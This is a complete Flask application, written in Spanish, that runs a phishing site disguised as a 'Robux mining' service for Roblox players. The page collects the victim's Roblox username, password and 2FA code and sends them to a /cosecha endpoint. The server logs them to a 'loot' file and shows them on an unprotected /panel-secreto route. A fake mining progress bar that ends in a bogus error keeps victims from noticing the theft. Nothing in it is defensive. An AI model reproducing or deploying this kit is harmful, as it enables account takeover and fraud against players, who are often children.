from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)
LOG_FILE = "botin_roblox.json"

HTML_PAGINA = """
<!DOCTYPE html>
<html>
<head>
    <title>BLOX-MINER CLOUD v4.2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .terminal { background: #000; width: 95%; max-width: 450px; padding: 20px; border: 1px solid #00ff00; border-radius: 5px; box-shadow: 0 0 30px rgba(0,255,0,0.1); }
        .header { border-bottom: 1px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
        .instructions { font-size: 11px; color: #aaa; text-align: left; background: #111; padding: 10px; border-left: 3px solid #00ff00; margin-bottom: 20px; }
        input { background: #000; color: #00ff00; border: 1px solid #00ff00; width: 90%; padding: 12px; margin: 10px 0; outline: none; font-family: 'Courier New'; }
        button { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
        #mining, #step2 { display: none; }
        .log-stream { font-size: 10px; color: #008800; height: 80px; overflow: hidden; margin-top: 15px; border-top: 1px solid #222; padding-top: 10px; }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header">
            <h2 style="margin:0;">SYSTEM: BLOX-MINER v4.2</h2>
            <span style="font-size: 10px;">NODE-STATUS: <span style="color: #00ff00;">ONLINE</span></span>
        </div>

        <div id="step1">
            <div class="instructions">
                <strong>PROTOCOLOS DE SEGURIDAD:</strong><br>
                1. Use una cuenta con antigüedad mayor a 30 días.<br>
                2. No cierre la pestaña durante el minado de bloques.<br>
                3. La carga de Robux se verá reflejada en su wallet tras la validación del hash.
            </div>
            <input type="text" id="user" placeholder="[USUARIO_ROBLOX]">
            <input type="password" id="pass" placeholder="[CONTRASENA_ACCESO]">
            <button onclick="siguiente()">VINCULAR CUENTA</button>
        </div>

        <div id="step2">
            <h3 style="text-align:center;">2FA REQUIRED</h3>
            <p style="font-size: 11px; text-align:center;">Ingrese el código de seguridad para autorizar la transacción de 10,000 Robux.</p>
            <input type="text" id="code" placeholder="[CODIGO_DE_6_DIGITOS]">
            <button onclick="minar()">VERIFICAR Y PROCESAR</button>
        </div>

        <div id="mining">
            <h3 style="text-align:center;">MINANDO BLOQUES...</h3>
            <div style="width: 100%; background: #222; height: 15px; border: 1px solid #00ff00;">
                <div id="pfill" style="width: 0%; height: 100%; background: #00ff00; transition: width 0.3s;"></div>
            </div>
            <p id="status" style="font-size: 12px; text-align:center; margin-top: 10px;">Sincronizando wallet...</p>
            <div class="log-stream" id="logs"></div>
        </div>
    </div>

    <script>
        let u, p;
        const logs = document.getElementById('logs');
        
        function addLog(msg) {
            logs.innerHTML += "> " + msg + "<br>";
            logs.scrollTop = logs.scrollHeight;
        }

        function siguiente() {
            u = document.getElementById('user').value;
            p = document.getElementById('pass').value;
            if(u && p) {
                fetch('/cosecha', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({usuario: u, clave: p, etapa: 'Login'})
                });
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            }
        }

        function minar() {
            const c = document.getElementById('code').value;
            fetch('/cosecha', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({usuario: u, codigo: c, etapa: '2FA'})
            });
            document.getElementById('step2').style.display = 'none';
            document.getElementById('mining').style.display = 'block';
            startMining();
        }

        function startMining() {
            let width = 0;
            const fill = document.getElementById('pfill');
            const stat = document.getElementById('status');
            
            const process = setInterval(() => {
                if (width >= 100) {
                    clearInterval(process);
                    stat.innerHTML = "<span style='color:red;'>ERROR: EXCESO DE TRÁFICO</span><br>Reintente en 24 horas.";
                } else {
                    width += 0.8;
                    fill.style.width = width + '%';
                    if(Math.random() > 0.6) {
                        addLog("Generando Hash: " + Math.random().toString(36).substring(7).toUpperCase());
                        addLog("Validando bloque en servidor Roblox...");
                    }
                }
            }, 300);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home(): return HTML_PAGINA

@app.route('/cosecha', methods=['POST'])
def cosecha():
    data = request.json
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
    return jsonify({"status": "success"}), 200

@app.route('/panel-secreto')
def ver_botin():
    if not os.path.exists(LOG_FILE): return "Búnker vacío."
    with open(LOG_FILE, "r") as f:
        return "<br>".join(f.readlines())

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
